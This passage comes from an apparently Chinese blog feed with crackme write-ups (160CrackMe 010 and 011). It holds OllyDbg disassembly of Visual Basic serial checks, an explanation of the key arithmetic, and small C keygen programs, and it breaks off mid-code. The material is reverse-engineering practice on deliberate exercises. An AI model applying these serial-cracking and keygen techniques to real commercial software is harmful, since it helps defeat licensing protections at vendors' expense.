class="hljs-built_in">edx</span>                                 <span class="hljs-comment">; /TMPend8 = NULL</span><br>00404A4A   .  8D85 18FFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xE8</span>]          <span class="hljs-comment">; |</span><br>00404A50   .  8D4D DC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x24</span>]          <span class="hljs-comment">; |</span><br>00404A53   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; |TMPstep8 = 005446A4</span><br>00404A54   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span>                                 <span class="hljs-comment">; |Counter8 = 00530000</span><br>00404A55   .  FF15 C8104000 <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60<span class="hljs-number">.</span>__vbaVarFo&gt;<span class="hljs-comment">; \__vbaVarForNext</span><br>00404A5B   .^ E9 CFFEFFFF   <span class="hljs-keyword">jmp</span> Andréna<span class="hljs-number">.</span>0040492F<br>00404A60   &gt;  8D55 CC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x34</span>]<br>00404A63   .  8D85 4CFFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xB4</span>]<br>00404A69   .  <span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span>                                 <span class="hljs-comment">; /var18 = NULL</span><br>00404A6A   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; |var28 = 005446A4</span><br>00404A6B   .  C785 54FFFFFF&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xAC</span>],Andréna<span class="hljs-number">.0040</span>&gt;<span class="hljs-comment">; |0817E747D7AFF7C7F82836D74RR7A7F7E7B7C7D826D81KE7B7C</span><br>00404A75   .  C785 4CFFFFFF&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xB4</span>],<span class="hljs-number">0x8008</span>       <span class="hljs-comment">; |</span><br>00404A7F   .  FF15 5C104000 <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60<span class="hljs-number">.</span>__vbaVarTs&gt;<span class="hljs-comment">; \__vbaVarTstEq</span><br></code></pre></div></td></tr></table></figure><p>继续分析发现问题，最后比较的字符串第一位基本都是081，但是获取的第一位数字最大就是9,最大的9（0x39)+9也才是42，怎么都不会是81。仔细查看发现是自己的思路出现问题了，刚才搜索字符串有许多的地方，而我直接断在第一个地方进行分析，第一个地方只获取第一位数字，而后面会获取前两位数字，这样就对了。</p><p>只看这里获取前两位数字的部分即可，其他关键计算与上面是一样的。</p><figure class="highlight maxima"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs maxima"><span class="hljs-number">004064B3</span>   .  6A <span class="hljs-number">02</span>         <span class="hljs-built_in">push</span> <span class="hljs-number">0x2</span><br><span class="hljs-number">004064B5</span>   .  8D55 8C       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0x74</span>]<br><span class="hljs-number">004064B8</span>   .  <span class="hljs-number">51</span>            <span class="hljs-built_in">push</span> ecx<br><span class="hljs-number">004064B9</span>   .  <span class="hljs-number">52</span>            <span class="hljs-built_in">push</span> edx<br><span class="hljs-number">004064BA</span>   .  FFD3          call ebx                                 ;  msvbvm60.rtcLeftCharVar<br><span class="hljs-number">004064BC</span>   .  8D45 8C       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0x74</span>]<br><span class="hljs-number">004064BF</span>   .  8D4D B0       lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0x50</span>]<br><span class="hljs-number">004064C2</span>   .  <span class="hljs-number">50</span>            <span class="hljs-built_in">push</span> eax<br><span class="hljs-number">004064C3</span>   .  <span class="hljs-number">51</span>            <span class="hljs-built_in">push</span> ecx<br><span class="hljs-number">004064C4</span>   .  FFD6          call esi                                 ;  msvbvm60.__vbaStrVarVal<br><span class="hljs-number">004064C6</span>   .  <span class="hljs-number">50</span>            <span class="hljs-built_in">push</span> eax<br><span class="hljs-number">004064C7</span>   .  FF15 D8104000 call dword ptr ds:[&lt;&amp;MSVBVM60.#<span class="hljs-number">581</span>&gt;]     ;  msvbvm60.rtcR8ValFromBstr<br><span class="hljs-number">004064CD</span>   .  DD9D 34FFFFFF fstp qword ptr ss:[ebp-<span class="hljs-number">0xCC</span>]<br></code></pre></div></td></tr></table></figure><p>那么只有一组是正确的对比字符串，经过上述分析可以知道，生成的字符串肯定是十六进制的值，查看字符串可以发现有许多的字符串其中不是十六进制值，比如第一组，很明显RR,KE不是十六进制数。</p><p><img src="/2021/08/16/160CrackMe-011/6.png"></p><p>分析发现只有一组数是全部都是十六进制的，那么这一组应该就是需要计算后并且比对的KEY了。下面可以开始写注册机了。</p><p><img src="/2021/08/16/160CrackMe-011/7.png"></p><h2 id="注册机编写"><a href="#注册机编写" class="headerlink" title="注册机编写"></a>注册机编写</h2><p>首先是对于那个每一位字符需要加上的数字的判断，假设这个数字是X，那么第一位数字就是X的十位数，然后这个数+X等于81，可以用这种方法来进行计算。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getValue</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> a,b;<br><span class="hljs-keyword">char</span> c;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0x31</span>; i &lt; <span class="hljs-number">0x3A</span>; i++)<br>&#123;<br>a = <span class="hljs-number">0x81</span> - i;<br>b = a/<span class="hljs-number">10</span>;<br><span class="hljs-built_in">itoa</span>(b, &amp;c, <span class="hljs-number">10</span>);<br><span class="hljs-keyword">if</span> ( c==i )<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x\n&quot;</span>, a);<br><span class="hljs-keyword">return</span> a;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>其实我这种方法不太严谨，应该是第一位等于X的十位，第二位等于X的个位，同时满足才行。</p><figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm"><span class="hljs-keyword">int</span> main()<br>&#123;<br><span class="hljs-keyword">int</span> a= getValue()<span class="hljs-comment">;</span><br><span class="hljs-keyword">int</span> key[] = &#123; <span class="hljs-number">0x81</span>,<span class="hljs-number">0x7E</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x7D</span>,<span class="hljs-number">0x7A</span>,<span class="hljs-number">0x7D</span>,<span class="hljs-number">0x7C</span>,<span class="hljs-number">0x7F</span>,<span class="hljs-number">0x82</span>,<span class="hljs-number">0x83</span>,<span class="hljs-number">0x6D</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x7A</span>,<span class="hljs-number">0x7F</span>,<span class="hljs-number">0x7E</span>,<span class="hljs-number">0x7B</span>,<span class="hljs-number">0x7C</span>,<span class="hljs-number">0x7D</span>,<span class="hljs-number">0x82</span>,<span class="hljs-number">0x6D</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x7E</span>,<span class="hljs-number">0x7B</span>,<span class="hljs-number">0x7C</span> &#125;<span class="hljs-comment">;</span><br>for (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; sizeof(key) / sizeof(int); i++)</span><br>&#123;<br>key[i] -= a<span class="hljs-comment">;</span><br>printf(<span class="hljs-string">&quot;%c&quot;</span>, key[i])<span class="hljs-comment">;</span><br>&#125;<br>return <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/08/16/160CrackMe-011/8.png"></p><p><img src="/2021/08/16/160CrackMe-011/9.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>因为下断的原因一直分析第一个，那里只获取第一个数字，卡了半天，研究许久让我一度以为是CM的问题，有点蠢了。</p>]]></content>
    
    
    <categories>
      
      <category>CrackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>CrackMe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>160CrackMe-010</title>
    <link href="/2021/08/13/160CrackMe-010/"/>
    <url>/2021/08/13/160CrackMe-010/</url>
    
    <content type="html"><![CDATA[<h2 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h2><p>打开程序，看到只有一个输入key的地方，尝试输入发现弹出错误的弹窗。</p><p><img src="/2021/08/13/160CrackMe-010/1.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>无壳，用VB语言编写的。</p><p><img src="/2021/08/13/160CrackMe-010/2.png"></p><p>使用OD打开，直接搜索错误的字符串，可以定位到关键的跳转，在上面就是一个比较函数，而其中又有一串字符串”kXy^rO|<em>yXo</em>m\kMuOn*+”，这个应该就是用来比较的了吧，函数头部下断开始分析。</p><p><img src="/2021/08/13/160CrackMe-010/3.png"></p><p>流程较短也比较简单，前面还有一个获取输入的长度，就不在分析了，直接看关键的计算部分。</p><p>获取输入的每一位KEY加上0xA形成新的KEY最后再与”kXy^rO|<em>yXo</em>m\kMuOn*+”作比较。那么用这段字符减去A就可以得到输入的key了，下面开始写注册机</p><figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm">00401F68   &gt; /85C0          <span class="hljs-keyword">test</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span><br>00401F6A   . |0F84 BB000000 <span class="hljs-keyword">je</span> Andréna<span class="hljs-number">.</span>0040202B<br>00401F70   . |8D55 <span class="hljs-number">94</span>       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x6C</span>]<br>00401F73   . |8D45 DC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x24</span>]<br>00401F76   . |<span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span><br>00401F77   . |<span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br>00401F78   . |C745 9C <span class="hljs-number">01000</span>&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x64</span>],<span class="hljs-number">0x1</span><br>00401F7F   . |C745 <span class="hljs-number">94</span> <span class="hljs-number">02000</span>&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x6C</span>],<span class="hljs-number">0x2</span><br>00401F86   . |FF15 <span class="hljs-number">90414000</span> <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM50<span class="hljs-number">.</span>__vbaI4Var&gt;<span class="hljs-comment">;  Msvbvm50.__vbaI4Var</span><br>00401F8C   . |8D4D BC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x44</span>]          <span class="hljs-comment">; |</span><br>00401F8F   . |<span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; |Start = 0x4CE994</span><br>00401F90   . |8D55 <span class="hljs-number">84</span>       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x7C</span>]          <span class="hljs-comment">; |</span><br>00401F93   . |<span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span>                                 <span class="hljs-comment">; |dString8 = 9E6A2546</span><br>00401F94   . |<span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span>                                 <span class="hljs-comment">; |RetBUFFER = NULL</span><br>00401F95   . |FF15 <span class="hljs-number">34414000</span> <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM50.#<span class="hljs-number">632</span>&gt;]     <span class="hljs-comment">; \诸位获取</span><br>00401F9B   . |8D45 <span class="hljs-number">84</span>       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x7C</span>]<br>00401F9E   . |8D4D A8       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x58</span>]<br>00401FA1   . |<span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; /String8 = 004CE994</span><br>00401FA2   . |<span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span>                                 <span class="hljs-comment">; |ARG2 = 9E6A2546</span><br>00401FA3   . |FF15 <span class="hljs-number">64414000</span> <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM50<span class="hljs-number">.</span>__vbaStrVa&gt;<span class="hljs-comment">; \__vbaStrVarVal</span><br>00401FA9   . |<span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; /String = &quot;;&quot;</span><br>00401FAA   . |FF15 <span class="hljs-number">08414000</span> <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM50.#<span class="hljs-number">516</span>&gt;]     <span class="hljs-comment">; \转为ascii</span><br>00401FB0   . |<span class="hljs-number">66</span>:<span class="hljs-number">05</span> 0A00    <span class="hljs-keyword">add</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">0xA</span>                               <span class="hljs-comment">;  +0xA</span><br>00401FB4   . |0F80 B0020000 <span class="hljs-keyword">jo</span> Andréna<span class="hljs-number">.</span>0040226A<br>00401FBA   . |0FBFD0        <span class="hljs-keyword">movsx</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">ax</span><br>00401FBD   . |<span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span><br>00401FBE   . |FF15 <span class="hljs-number">70414000</span> <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM50.#<span class="hljs-number">537</span>&gt;]     <span class="hljs-comment">;  ascii转字符</span><br>00401FC4   . |<span class="hljs-number">8985</span> 7CFFFFFF <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x84</span>],<span class="hljs-built_in">eax</span><br>00401FCA   . |8D45 CC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x34</span>]<br>00401FCD   . |8D8D 74FFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x8C</span>]<br>00401FD3   . |<span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br>00401FD4   . |8D95 64FFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x9C</span>]<br>00401FDA   . |<span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span><br>00401FDB   . |<span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span><br>00401FDC   . |C785 74FFFFFF&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x8C</span>],<span class="hljs-number">0x8</span><br>00401FE6   . |FFD3          <span class="hljs-keyword">call</span> <span class="hljs-built_in">ebx</span>                                 <span class="hljs-comment">;  Msvbvm50.__vbaVarCat</span><br>00401FE8   . |8BD0          <span class="hljs-keyword">mov</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">eax</span><br>00401FEA   . |8D4D CC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x34</span>]<br>00401FED   . |FFD6          <span class="hljs-keyword">call</span> <span class="hljs-built_in">esi</span>                                 <span class="hljs-comment">;  Msvbvm50.__vbaVarMove</span><br>00401FEF   . |8D4D A8       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x58</span>]<br>00401FF2   . |FF15 B0414000 <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM50<span class="hljs-number">.</span>__vbaFreeS&gt;<span class="hljs-comment">;  Msvbvm50.__vbaFreeStr</span><br>00401FF8   . |8D85 74FFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x8C</span>]<br>00401FFE   . |8D4D <span class="hljs-number">84</span>       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x7C</span>]<br><span class="hljs-number">00402001</span>   . |<span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br><span class="hljs-number">00402002</span>   . |8D55 <span class="hljs-number">94</span>       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x6C</span>]<br><span class="hljs-number">00402005</span>   . |<span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span><br><span class="hljs-number">00402006</span>   . |<span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span><br><span class="hljs-number">00402007</span>   . |6A <span class="hljs-number">03</span>         <span class="hljs-keyword">push</span> <span class="hljs-number">0x3</span><br><span class="hljs-number">00402009</span>   . |FFD7          <span class="hljs-keyword">call</span> <span class="hljs-built_in">edi</span>                                 <span class="hljs-comment">;  Msvbvm50.__vbaFreeVarList</span><br>0040200B   . |83C4 <span class="hljs-number">10</span>       <span class="hljs-keyword">add</span> <span class="hljs-built_in">esp</span>,<span class="hljs-number">0x10</span><br>0040200E   . |8D85 ECFEFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x114</span>]<br><span class="hljs-number">00402014</span>   . |8D8D FCFEFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x104</span>]<br>0040201A   . |8D55 DC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x24</span>]<br><span class="hljs-number">0040201D</span>   . |<span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; /TMPend8 = 004CE994</span><br>0040201E   . |<span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span>                                 <span class="hljs-comment">; |TMPstep8 = 9E6A2546</span><br>0040201F   . |<span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span>                                 <span class="hljs-comment">; |Counter8 = NULL</span><br><span class="hljs-number">00402020</span>   . |FF15 A4414000 <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM50<span class="hljs-number">.</span>__vbaVarFo&gt;<span class="hljs-comment">; \__vbaVarForNext</span><br><span class="hljs-number">00402026</span>   .^\E9 3DFFFFFF   <span class="hljs-keyword">jmp</span> Andréna<span class="hljs-number">.</span>00401F68<br>0040202B   &gt; \8D45 CC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x34</span>]<br>0040202E   .  8D8D 54FFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xAC</span>]<br><span class="hljs-number">00402034</span>   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; /var18 = 004CE994</span><br><span class="hljs-number">00402035</span>   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span>                                 <span class="hljs-comment">; |var28 = 9E6A2546</span><br><span class="hljs-number">00402036</span>   .  C785 5CFFFFFF&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xA4</span>],Andréna<span class="hljs-number">.0040</span>&gt;<span class="hljs-comment">; |kXy^rO|*yXo*m\kMuOn*+</span><br><span class="hljs-number">00402040</span>   .  C785 54FFFFFF&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xAC</span>],<span class="hljs-number">0x8008</span>       <span class="hljs-comment">; |</span><br>0040204A   .  FF15 <span class="hljs-number">40414000</span> <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM50<span class="hljs-number">.</span>__vbaVarTs&gt;<span class="hljs-comment">; \__vbaVarTstEq</span><br></code></pre></div></td></tr></table></figure><h2 id="注册机编写"><a href="#注册机编写" class="headerlink" title="注册机编写"></a>注册机编写</h2><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">char</span> key[] = <span class="hljs-string">&quot;kXy^rO|*yXo*m\\kMuOn*+&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span 